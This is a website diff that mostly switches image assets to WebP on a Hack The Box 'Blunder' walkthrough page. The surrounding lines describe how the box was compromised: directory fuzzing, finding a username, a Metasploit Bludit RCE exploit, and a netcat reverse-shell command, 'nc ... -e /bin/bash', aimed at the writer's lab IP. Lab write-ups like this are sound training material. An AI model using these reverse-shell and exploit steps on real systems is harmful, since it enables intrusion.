@@ -160,8 +160,8 @@
           </header>
 
           <div class="article-content">
-            <p><a href="/assets/documentation/blunder-a426bd3c845dc928ae9806f05134e951aa4290173855e024e5aaaf6742f5d341.jpg">
-  <img src="/assets/documentation/blunder-a426bd3c845dc928ae9806f05134e951aa4290173855e024e5aaaf6742f5d341.jpg" alt="Blunder" class="zooming" data-rjs="/assets/documentation/blunder-a426bd3c845dc928ae9806f05134e951aa4290173855e024e5aaaf6742f5d341.jpg" data-zooming-width="1200" data-zooming-height="675" />
+            <p><a href="/assets/documentation/blunder-488963ee26a92f7da214a3a3d5bfc53eaf11671ec2052b5207054b75b66fe978.webp">
+  <img src="/assets/documentation/blunder-488963ee26a92f7da214a3a3d5bfc53eaf11671ec2052b5207054b75b66fe978.webp" alt="Blunder" class="zooming" data-rjs="/assets/documentation/blunder-488963ee26a92f7da214a3a3d5bfc53eaf11671ec2052b5207054b75b66fe978.webp" data-zooming-width="1200" data-zooming-height="675" />
 </a></p>
 
 <h2 id="htb---blunder">HTB - Blunder</h2>
@@ -197,8 +197,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 <h4 id="enumerating-the-web-server">Enumerating the web server</h4>
 
-<p><a href="/assets/documentation/blunderwebserver-dec3c92f0413b55c5f9aaf40655d5041ada3d8ab82921d5a810faf46c268155a.png">
-  <img src="/assets/documentation/blunderwebserver-dec3c92f0413b55c5f9aaf40655d5041ada3d8ab82921d5a810faf46c268155a.png" alt="Blunderwebsiteimage" class="zooming" data-rjs="/assets/documentation/blunderwebserver-dec3c92f0413b55c5f9aaf40655d5041ada3d8ab82921d5a810faf46c268155a.png" data-zooming-width="1366" data-zooming-height="714" />
+<p><a href="/assets/documentation/blunderwebserver-6efaaeb1b83c3a3f54cecab58ca48d106211fc6f69f34ee25c709944f80e2d19.webp">
+  <img src="/assets/documentation/blunderwebserver-6efaaeb1b83c3a3f54cecab58ca48d106211fc6f69f34ee25c709944f80e2d19.webp" alt="Blunderwebsiteimage" class="zooming" data-rjs="/assets/documentation/blunderwebserver-6efaaeb1b83c3a3f54cecab58ca48d106211fc6f69f34ee25c709944f80e2d19.webp" data-zooming-width="1366" data-zooming-height="714" />
 </a></p>
 
 <p>About section has a note <code class="highlighter-rouge">I created this site to dump my fact files, nothing more.......?</code>, did some basic enum like checking for <code class="highlighter-rouge">robots.txt</code>, reading source code but got nothing. So let’s start a gobuster scan for directory fuzzing.</p>
@@ -230,15 +230,15 @@ by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; 
 
 <p><code class="highlighter-rouge">todo.txt</code> and <code class="highlighter-rouge">admin</code> page looks interesting, checking out the <code class="highlighter-rouge">todo.txt</code> file first.</p>
 
-<p><a href="/assets/documentation/blundertodo-7e3309122a772f27c90c0defad425214964169fc954c65e795de679d3b788115.png">
-  <img src="/assets/documentation/blundertodo-7e3309122a772f27c90c0defad425214964169fc954c65e795de679d3b788115.png" alt="Blundertodolist" class="zooming" data-rjs="/assets/documentation/blundertodo-7e3309122a772f27c90c0defad425214964169fc954c65e795de679d3b788115.png" data-zooming-width="1366" data-zooming-height="714" />
+<p><a href="/assets/documentation/blundertodo-1ad16d14f362f0d1d39435014971cca89444770d16002d95c2f1f925fab2ab43.webp">
+  <img src="/assets/documentation/blundertodo-1ad16d14f362f0d1d39435014971cca89444770d16002d95c2f1f925fab2ab43.webp" alt="Blundertodolist" class="zooming" data-rjs="/assets/documentation/blundertodo-1ad16d14f362f0d1d39435014971cca89444770d16002d95c2f1f925fab2ab43.webp" data-zooming-width="1366" data-zooming-height="714" />
 </a></p>
 
 <p><code class="highlighter-rouge">fergus</code> looks like a username.<br />
 Let’s check the <code class="highlighter-rouge">/admin</code> pannel.</p>
 
-<p><a href="/assets/documentation/blunderadmin-8450821bd4efe2266cf7bb4f43a7805b0b52d4dc4987684beba22d59d038e5db.png">
-  <img src="/assets/documentation/blunderadmin-8450821bd4efe2266cf7bb4f43a7805b0b52d4dc4987684beba22d59d038e5db.png" alt="BlunderAdmin" class="zooming" data-rjs="/assets/documentation/blunderadmin-8450821bd4efe2266cf7bb4f43a7805b0b52d4dc4987684beba22d59d038e5db.png" data-zooming-width="1366" data-zooming-height="715" />
+<p><a href="/assets/documentation/blunderadmin-264dc34120abab3a71966f168f527b48b664bcbdd74f76726590d56edadbb0c1.webp">
+  <img src="/assets/documentation/blunderadmin-264dc34120abab3a71966f168f527b48b664bcbdd74f76726590d56edadbb0c1.webp" alt="BlunderAdmin" class="zooming" data-rjs="/assets/documentation/blunderadmin-264dc34120abab3a71966f168f527b48b664bcbdd74f76726590d56edadbb0c1.webp" data-zooming-width="1366" data-zooming-height="715" />
 </a></p>
 
 <p><code class="highlighter-rouge">Bludit</code> is a <code class="highlighter-rouge">CMS</code> and searching <code class="highlighter-rouge">Bludit</code> in <code class="highlighter-rouge">metasploit</code> gives us a RCE exploit but it needs the authentication creds of admin pannel.</p>
@@ -339,8 +339,8 @@ but on enumerating more in <code class="highlighter-rouge">/var/www</code> we ca
 
 <p>You can directly jump to <a href="https://fumenoid.github.io/posts/htb-blunder#rooting-the-box">root part</a>..<br />I am covering an issue I faced during this box… IDK why but my meterpreter was messing up when I used shell command, maybe I used a wrong payload. So I executed a nc reverse shell command and got another shell nc. <em>yes I could have changed the meterpreter payload and reused bludit exploit.</em></p>
 
-<p><a href="/assets/documentation/blundermeta-3635415f3a4ec51a556f906e7d64d548dc3b9f0d19011959536259d990dd6a91.png">
-  <img src="/assets/documentation/blundermeta-3635415f3a4ec51a556f906e7d64d548dc3b9f0d19011959536259d990dd6a91.png" alt="BlunderMetapreter" class="zooming" data-rjs="/assets/documentation/blundermeta-3635415f3a4ec51a556f906e7d64d548dc3b9f0d19011959536259d990dd6a91.png" data-zooming-width="1185" data-zooming-height="632" />
+<p><a href="/assets/documentation/blundermeta-fae246fe80053d445b611f5d42c725f0ddef05171098089efa05165f1d26a8d8.webp">
+  <img src="/assets/documentation/blundermeta-fae246fe80053d445b611f5d42c725f0ddef05171098089efa05165f1d26a8d8.webp" alt="BlunderMetapreter" class="zooming" data-rjs="/assets/documentation/blundermeta-fae246fe80053d445b611f5d42c725f0ddef05171098089efa05165f1d26a8d8.webp" data-zooming-width="1185" data-zooming-height="632" />
 </a></p>
 
 <p>I tried <code class="highlighter-rouge">nc 10.10.14.10 9001 -e /bin/bash</code> it didn’t work, So i used this nc revershell command to get a revshell.</p>
